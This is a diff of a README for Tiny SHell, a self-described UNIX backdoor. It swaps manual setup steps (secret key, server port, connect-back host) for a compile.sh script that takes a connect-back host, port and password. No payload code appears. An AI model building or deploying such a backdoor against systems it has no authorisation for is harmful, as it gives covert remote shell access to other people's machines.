@@ -1,22 +1,22 @@
-# Tiny SHell
-## An open-source UNIX backdoor
+## Tiny SHell - An open-source UNIX backdoor
 
-* Before compiling Tiny SHell
+* ~~Before compiling Tiny SHell~~
+  (_You can do these at once with `compile.sh`, see below_)
 
-    1. First of all, you should setup your secret key, which
+    1. ~~First of all, you should setup your secret key, which
        is located in `tsh.h`; the key can be of any length (use
-       at least 12 characters for better security).
+       at least 12 characters for better security).~~
 
-    2. It is advised to change `SERVER_PORT`, the port on which
-       the server will be listening for incoming connections.
+    2. ~~It is advised to change `SERVER_PORT`, the port on which
+       the server will be listening for incoming connections.~~
 
-    3. You may want to start tshd in "connect-back" mode if
+    3. ~~You may want to start tshd in "connect-back" mode if
        it runs on on a firewalled box; simply uncomment and
-       modify `CONNECT_BACK_HOST` in `tsh.h`.
+       modify `CONNECT_BACK_HOST` in `tsh.h`.~~
 
 * Compiling Tiny SHell
 
-    Run `make <system>`, where <system> can be any one of these:
+    Run `compile.sh OS BC_HOST BC_PORT [PASSWORD] [BC_DELAY]`, where `OS` can be any one of these:
     `linux`, `freebsd`, `openbsd`, `netbsd`, `cygwin`, `sunos`, `irix`, `hpux`, `osf`
 
 * How to use the server
